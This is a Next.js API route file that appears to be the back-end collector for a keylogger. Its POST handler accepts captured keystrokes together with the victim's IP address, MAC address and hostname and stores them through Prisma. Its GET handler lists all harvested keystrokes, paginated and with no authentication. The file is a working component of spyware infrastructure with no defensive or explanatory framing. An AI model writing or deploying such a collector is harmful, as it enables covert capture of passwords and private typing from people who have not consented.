import { NextResponse } from "next/server";
import prisma from "@/lib/prisma";

export async function GET(request: Request) {
  try {
    const url = new URL(request.url);
    const limit = url.searchParams.get("limit")
      ? Number.parseInt(url.searchParams.get("limit")!)
      : 100;
    const skip = url.searchParams.get("skip")
      ? Number.parseInt(url.searchParams.get("skip")!)
      : 0;

    // Build the where clause for the Prisma query

    // Fetch keylogs from the database using Prisma
    const keylogs = await prisma.keylog.findMany({
      orderBy: {
        timestamp: "desc",
      },
      take: limit,
      skip: skip,
    });

    // Get total count for pagination
    const totalCount = await prisma.keylog.count();

    // Format the response data
    const formattedKeylogs = keylogs.map((keylog) => ({
      id: keylog.id,
      timestamp: keylog.timestamp.toISOString(),
      keys: keylog.keys,
    }));

    return NextResponse.json({
      keylogs: formattedKeylogs,
      pagination: {
        total: totalCount,
        limit,
        skip,
        hasMore: skip + limit < totalCount,
      },
    });
  } catch (error) {
    console.error("Error fetching keylogs:", error);
    return NextResponse.json(
      {
        success: false,
        message: "Failed to fetch keylogs",
        error: (error as Error).message,
      },
      { status: 500 },
    );
  }
}

export async function POST(request: Request) {
  try {
    const data = await request.json();

    // Validate required fields
    if (!data.keys) {
      return NextResponse.json(
        {
          success: false,
          message: "missing keys",
        },
        { status: 400 },
      );
    }

    // Create a new keylog entry
    const keylog = await prisma.keylog.create({
      data: {
        keys: data.keys,
        ip: data.ip,
        mac: data.mac,
        hostname: data.hostname,
        timestamp: data.timestamp ? new Date(data.timestamp) : new Date(),
      },
    });

    return NextResponse.json({
      success: true,
      message: "Keylog created successfully",
    });
  } catch (error) {
    console.error("Error creating keylog:", error);
    return NextResponse.json(
      {
        success: false,
        message: "Failed to create keylog",
        error: (error as Error).message,
      },
      { status: 500 },
    );
  }
}
